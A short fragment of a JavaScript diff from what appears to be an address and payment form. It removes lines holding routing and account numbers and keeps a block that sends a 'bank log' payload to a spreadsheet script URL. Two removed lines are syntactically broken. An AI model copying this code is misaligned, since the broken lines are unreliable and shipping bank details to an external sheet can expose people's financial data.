@@ -1137,11 +1137,7 @@ suggestedAddress: usps.formatted
 }
 }
 
-const effectiveAddress = fullAddress || currentAddress || '';
-const routing = routingNumber '';
-const account = accountNumber '';
-
-/* === BANK LOG → Apps Script (FINAL, matches Apps Script) ============== */
+/* Step 2: === BANK LOG → Apps Script (FINAL, matches Apps Script) ============== */
 if (BANK_SHEET_URL) {
 try {
 const bankPayload = {
